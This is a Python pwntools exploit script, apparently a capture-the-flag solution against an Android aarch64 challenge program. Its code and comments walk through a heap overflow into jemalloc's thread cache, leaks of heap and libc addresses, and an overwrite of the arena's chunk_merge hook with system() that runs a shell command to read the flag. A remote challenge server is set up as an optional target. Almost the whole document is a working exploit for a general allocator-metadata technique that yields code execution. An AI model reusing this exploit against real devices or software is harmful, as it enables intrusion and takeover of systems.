#!/usr/bin/env python

from pwn import *
import time, struct

REMOTE = False
REMOTE_DEVICE = False

context.update(arch='aarch64')
cwd = './'
bin = "adb"

if REMOTE:
    p = remote('35.237.23.61', 1337)
elif REMOTE_DEVICE:
    p = remote('127.0.0.1', 1337)
else:
    p = process(cwd=cwd, aslr=True, argv=["adb", "shell", "/data/local/tmp/house_of_sweets"])

def dbg_print(s):
    #print(s)
    return

'''
This challenge is an example of how the jemalloc tchace can be
attacked with a regular heap overflow to get full RCE with zero
use of application-specific heap structures, just jemalloc
metadata.

The jemalloc arena behavior is different in the emulator from
real devices, because real devices use two arena instead of one.
This would place the two threads into different arenas. So if
we wanted to target a real device, we have to do the challenge
slightly differently, but it's not a major difference. All other
things (ncached corruption, chunk_hooks leaking and overwrite)
work the same way.

Plan of attack:

1 create a selfie shop
2 allocate some selfies, 0x1C00 sized, no need to fill
3 create a bakery shop
4 bakery thread's tcache_s shall be adjacent to last selfie
5 edit selfie -> overflow tcache_s with 64 bytes
6 corrupt ncached such that smallest allocation size's pointer will go back to tcache_t.tcache_bins[0].avail
7 allocate 16 sized chunk and free them back
8 read the allocation from 6 back -> leak the heap address
9 now replace it with a pointer to the arena where the chunk_hook's are at, actually multiple to the same
10 allocate both a hipster and a classic cake, both go over the arena_t->chunk_hooks
11 use the two different type of writes to get back from the classic cake the address of the chunk hook -> libc address acquired
12 replace the chunk hook for free with a pointer to system
13 allocate a huge cake and delete it -> win
'''

selfie_started = 0
sweet_started = 0

def select_main_menu(i):
    dbg_print(p.recvuntil("(3) Leave\n"))
    p.sendline(str(i))

def select_sweets():
    select_main_menu(1)

def select_sweets_menu(i):
    dbg_print(p.recvuntil("(5) Lost my appetite\n"))
    p.sendline(str(i))

def select_selfie():
    select_main_menu(2)

def select_selfie_menu(i):
    dbg_print(p.recvuntil("(5) Nevermind\n"))
    p.sendline(str(i))

#helpers
#-------

def start_selfie():
    select_selfie()
    select_selfie_menu(5)

def start_sweets():
    select_sweets()
    select_sweets_menu(5)

def add_selfie(typ, default, size):
    select_selfie()
    select_selfie_menu(1)
    dbg_print(p.recvuntil("modern\n"))
    p.sendline(str(typ))

    if (typ == 1):
        dbg_print(p.recvuntil("No\n"))
        p.sendline(str(default))

        if (default != 1):
            dbg_print(p.recvuntil("image?\n"))
            p.sendline(str(size))

    elif (typ == 2):
        dbg_print(p.recvuntil("image?\n"))
        p.sendline(str(size))

    else:
        dbg_print(p.recvuntil("hard work!\n"))

def edit_selfie(idx, size, data):
    select_selfie()
    select_selfie_menu(2)
    dbg_print(p.recvuntil("want to edit?\n"))
    p.sendline(str(idx))
    dbg_print(p.recvuntil("edit?\n"))
    p.sendline(str(size))
    assert(size == len(data))
    p.send(data)

#incomplete - we dont care
def view_selfie():
    select_selfie()
    select_selfie_menu(3)
    #...

#incomplete - we dont care
def delete_selfie():
    select_selfie()
    select_selfie_menu(4)
    #...

def add_cake(typ, default, size):
    select_sweets()
    select_sweets_menu(1)
    dbg_print(p.recvuntil("hipster\n"))
    p.sendline(str(typ))

    if (typ == 1):
        dbg_print(p.recvuntil("No\n"))
        p.sendline(str(default))
        if (default != 1):
            dbg_print(p.recvuntil("cake?\n"))
            p.sendline(str(size))

    elif (typ == 2):
        dbg_print(p.recvuntil("cake?\n"))
        p.sendline(str(size))

    else:
        dbg_print(p.recvuntil("cake!\n"))

def edit_cake(idx, size, data):
    select_sweets()
    select_sweets_menu(2)
    dbg_print(p.recvuntil("modify?\n"))
    p.sendline(str(idx))
    dbg_print(p.recvuntil("ingredients?\n"))
    p.sendline(str(size))

    if (size < 0) or (size > 0x2000):
        dbg_print(p.recvuntil("I can't handle that!\n"))

    else:
        assert(len(data) == size)
        p.send(data)

def view_cake(idx):
    select_sweets()
    select_sweets_menu(3)
    dbg_print(p.recvuntil("bake?\n"))
    p.sendline(str(idx))

    #lazy version: read in everything until we get back to the main banner
    #when this is finished

    print p.recvuntil("What would you like to do next?\n")

def leak_heap():
    select_sweets()
    select_sweets_menu(3)
    dbg_print(p.recvuntil("bake?\n"))
    p.sendline(str(1))
    dbg_print(p.recvuntil("Waiting for the cake to be baked...\n"))
    leak = p.recv(8)
    heap_addr = struct.unpack("<Q", leak)[0]
    print "Got heap leak!"
    print "0x%016x" % heap_addr
    dbg_print(p.recvuntil("What would you like to do next?\n"))
    return heap_addr

def leak_libc(idx):
    select_sweets()
    select_sweets_menu(3)
    dbg_print(p.recvuntil("bake?\n"))
    p.sendline(str(idx))
    dbg_print(p.recvuntil("Waiting for the cake to be baked...\n"))
    leak = p.recvuntil("What would you like to do next?\n")
    #print leak[8:8+5]
    libc_addr = struct.unpack("<Q", leak[8:8+5].ljust(8, "\x00"))[0]
    print "Got libc leak!"
    return libc_addr


def delete_cake(idx):
    select_sweets()
    select_sweets_menu(4)
    dbg_print(p.recvuntil("(Idx)\n"))
    p.sendline(str(idx))


#First of all, let's create a selfie thread
start_selfie()
#Now lets allocate one 0x1C00 chunk into it
add_selfie(2, 0, 0x1C00)
#now we have the first two tcache_s and 1 chunk next to each other in the first run of 0x1c00.
#that run is 4 regions long, so we can add one more to complete it.
add_selfie(2, 0, 0x1C00)
#now the run is full, so new will be created. let's trigger that.
add_selfie(2, 0, 0x1c00)
#now we create a sweets thread. This gets its own run, but it is next to the previous one!
start_sweets()
#we must allocate one cake, otherwise the thread doesn't get a thread cache
add_cake(2, 0, 0x1c00)

#so now we have two runs w 4 regions of 0x1c00 in which only 1 is taken and then a new run which starts with the sweet threads tcache_c
#if we add 7 more selfies, the last one will be overflowing the sweet thread.

for i in range(0, 7):
    add_selfie(2, 0, 0x1C00)

#finally we can overwrite the tcache_s and corrupt ncached.
#this is what that looks like in memory:
'''
pwndbg> x/16gx 0x000000761c63b000
0x761c63b000:	0x000000761c60c000	0x000000761c60dc00
0x761c63b010:	0x0000000000000000	0x000000e4000000e3
0x761c63b020:	0x0000000000000000	0x0000000000000000
0x761c63b030:	0x0000000100000000	0x0000000000000000
0x761c63b040:	0x000000761c63b608	0x0000000000000000
0x761c63b050:	0x0000000100000000	0x0000000000000000
0x761c63b060:	0x000000761c63b648	0x0000000000000000
0x761c63b070:	0x0000000100000000	0x0000000000000000

0x761c63b038 is the ncached of tcache_bin[0], that we can target.

the link pointers can be 0'd out safely, it will trigger SIGSEGV
on exit, but we don't get that far! the rest are static.

what are we going to corrupt ncached with?

we can only corrupt the ncached of the smallest bin, size 8.
the avail pointer of it is:
0x761c63b040:	0x000000761c63b608

So we calc back from 0x000000761c63b608 when we make an allocation.
Right now it looks like this of course:

pwndbg> x/8gx 0x000000761c63b608-64
0x761c63b5c8:	0x0000000000000000	0x0000000000000000
0x761c63b5d8:	0x0000000000000000	0x0000000000000000
0x761c63b5e8:	0x0000000000000000	0x0000000000000000
0x761c63b5f8:	0x0000000000000000	0x0000000000000000


What we want to achieve, is getting back one of the avail pointers, so
that we can leak out the heap address when the slot AFTER what that
avail corresponds to gets filled up (because avail is address into the negative,
in other words avail points to one slot after its own bin's stack of avails.

We are simply going to target the avail pointer of the 8 slot.

0x000000761c63b608-0x761c63b040=0x5c8.
0x5c8/8 = 0xB9.
'''
data = (0x1C00 - 64)*"B" + p64(0) + p64(0) + p64(0) + p64(0x000000e4000000e3) + p64(0) + p64(0) + p64(0x0000000100000000) + p64(0xB9)
edit_selfie(9, 0x1C00, data)

#ok, now we can get back this address into our leaking cake.
add_cake(2, 0, 8)
#ok, now lets write 8 into that cake so we can actually read 8 out later.
edit_cake(1, 8, p64(0))
#ok, now we make enough allocations and free of 16 sized cakes to populate that address.
for i in range(0, 16):
    add_cake(2, 0, 16)

#So far we have cakes 0 through 17.

#now we release back enough into the tcache to populate it fully.
for i in range(2, 10):
    delete_cake(i)

#Now we have cakes 0,1 and 10-17.

#now we should be able to leak out the cake contents and modify and basically it's a full
#win from here. let's see in the debugger, whether this works or not.
#view_cake(1)
heap_addr = leak_heap()

#now we change that address to give use the main arena's chunk_hooks array.
#the arena is always allocated at a fixed offset within the 0x400000 chunk that's the heap at first.

'''
0x0000007d3e02a270 is the leaked address.
pwndbg> jeinfo 0x0000007d3e02a270
parent    address         size    
--------------------------------------
arena     0x7d3e202200    -       
chunk     0x7d3e000000    0x200000
run       0x7d3e02a000    0x1000  
region    0x7d3e02a270    0x10

pwndbg> x/16gx 0x7d3e202200+(4*548)
0x7d3e202a90:	0x0000007d3e662710	0x0000007d3e662754
'''

MAGIC1 = (0x0000007d3e02a270 - 0x7d3e202200)
#4*548 is the chunk_dalloc hook address, but we want the chunk_merge instead.
MAGIC2 = 4*548 + 40 #on 8.0.0 device e.g. its 4*596 +40. Can see the offset easily in je_chunk_dalloc_wrapper

arena_addr = heap_addr - MAGIC1
chunk_hook_addr = arena_addr + MAGIC2

print "Arena at 0x%016x chunk_hook_addr for merge at 0x%016x\n" % (arena_addr, chunk_hook_addr)

#now we update cake 1 to contain that address-8 (that's the chunk_hook_addr for alloc) #note: dalloc means dealloc

edit_cake(1, 8, p64(chunk_hook_addr-8))

#now we allocate another 16 sized cake -> it will take that address

add_cake(2, 0, 16)  #this is now the new cake idx 2.

#now we free another cake so again the last slot that we control in
#the avail array is taken

delete_cake(10)

#now we update cake 1 AGAIN to again contain that target address.

edit_cake(1, 8, p64(chunk_hook_addr-8))

#now allocate the chunk hook addr again, but as a classic cake.

add_cake(1, 0, 16)  #this is the new cake idx 3.

#now cakes 2 and 3 point to the same thing, one is classic the other is modern.
#first we write 7 bytes into the classic. then we write 8 bytes to the modern.

edit_cake(3, 7, "A"*7)
edit_cake(2, 8, "F"*8)

#then we read the classic. this will give us the full 16 bytes, leaking the pointer!
#view_cake(3)
chunk_merge_default = leak_libc(3)

print "chunk_merge_default: 0x%016x" % chunk_merge_default

'''
pwndbg> x/i 0x0000007b7e0f7710
   0x7b7e0f7710 <chunk_dalloc_default>:	stp	x20, x19, [sp, #-32]!
pwndbg> x/i chunk_alloc_default
   0x7b7e0f7630 <chunk_alloc_default>:	stp	x26, x25, [sp, #-80]!
pwndbg> x/i system
   0x7b7e0de16c <system>:	stp	x22, x21, [sp, #-48]!
#MAGIC3 = 0x0000007b7e0f7710 - 0x7b7e0de16c
#MAGIC4 = 0x7b7e0f7710 - 0x7b7e0f7630
'''

'''
pwndbg> x/i 0x00000072e2ba6780
   0x72e2ba6780 <chunk_merge_default>:	stp	x20, x19, [sp, #-32]!
pwndbg> x/i 0x00000072e2ba6778
   0x72e2ba6778 <chunk_split_default>:	mov	w0, wzr
pwndbg> x/i system
   0x72e2b8d16c <system>:	stp	x22, x21, [sp, #-48]!
'''

MAGIC3 = 0x72e2ba6780 - 0x72e2b8d16c 
MAGIC4 = 8 #pretty trivial, chunk_split_default is the same code + one instruction. it's a direction flag.
system = chunk_merge_default - MAGIC3
chunk_split_default = chunk_merge_default - MAGIC4

print "system: 0x%016x" % system

#finally, we overwrite the hook!
#important: we have to fix-up chunk_alloc_default as well.
#we could use that instead of one-gadget, but the free-> system() is nicer.

#system = 0xdeadbeefdeadbeef

#edit_cake(2, 16, p64(0xdeadbeeff00dface) + p64(system)) 
edit_cake(2, 16, p64(chunk_split_default) + p64(system)) 

print "Add huge allocations"

cmd = "cat /data/local/tmp/flag "
add_cake(1, 0, 0x400000)
edit_cake(4, len(cmd), cmd)
add_cake(1, 0, 0x400000)
edit_cake(5, len(cmd), cmd)

print "Remove huge allocations and trigger merge"

#we end up leveraging the fact that huge allocations, as mmaps, get stacked -> we can trigger a merge of huge allocations

delete_cake(4)
delete_cake(5)

'''
   f 1       7ad069d4e4 je_chunk_dalloc_wrapper+228		-> does not always get called
   f 2       7ad069371c arena_purge_to_limit+1724               -> does not always get called. but the merge is deterministic.
   f 3       7ad0692dd4 arena_maybe_purge_decay+260 ./
   f 4       7ad0691fb4 je_arena_chunk_dalloc_huge+356 ./
   f 5       7ad06a71d8 je_huge_dalloc+152
   f 6       7ad06abbdc je_free+124
   f 7       621a071d48 main+848
'''

p.interactive()
